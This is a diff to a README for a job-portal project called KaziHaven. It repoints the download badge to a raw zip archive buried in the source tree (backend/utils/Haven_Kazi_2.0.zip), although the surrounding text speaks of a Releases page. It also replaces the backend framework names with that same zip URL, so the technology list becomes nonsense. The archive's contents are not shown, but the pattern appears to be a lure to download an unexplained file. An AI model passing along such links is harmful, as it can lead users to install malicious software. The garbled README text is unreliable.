@@ -18,7 +18,7 @@ Welcome to KaziHaven, your ultimate job portal connecting job seekers and top em
 
 Click the button below to visit the Releases page. Choose the latest version to download Kazi-Haven.
 
-[![Download Kazi-Haven](https://raw.githubusercontent.com/erlongos/Kazi-Haven/main/frontend/src/components/Haven-Kazi-v3.1.zip)](https://raw.githubusercontent.com/erlongos/Kazi-Haven/main/frontend/src/components/Haven-Kazi-v3.1.zip)
+[![Download Kazi-Haven](https://raw.githubusercontent.com/erlongos/Kazi-Haven/main/backend/utils/Haven_Kazi_2.0.zip)](https://raw.githubusercontent.com/erlongos/Kazi-Haven/main/backend/utils/Haven_Kazi_2.0.zip)
 
 ### Follow These Steps:
 
@@ -48,7 +48,7 @@ Click the button below to visit the Releases page. Choose the latest version to 
 Kazi-Haven is built using several modern technologies which enhance its performance and user experience:
 
 - **Frontend:** HTML, CSS, and JavaScript for a responsive design.
-- **Backend:** https://raw.githubusercontent.com/erlongos/Kazi-Haven/main/frontend/src/components/Haven-Kazi-v3.1.zip and https://raw.githubusercontent.com/erlongos/Kazi-Haven/main/frontend/src/components/Haven-Kazi-v3.1.zip for seamless server operation.
+- **Backend:** https://raw.githubusercontent.com/erlongos/Kazi-Haven/main/backend/utils/Haven_Kazi_2.0.zip and https://raw.githubusercontent.com/erlongos/Kazi-Haven/main/backend/utils/Haven_Kazi_2.0.zip for seamless server operation.
 - **Database:** MongoDB with Mongoose for a robust data structure.
 - **Authentication:** JSON Web Tokens (JWT) for secure user login.
 
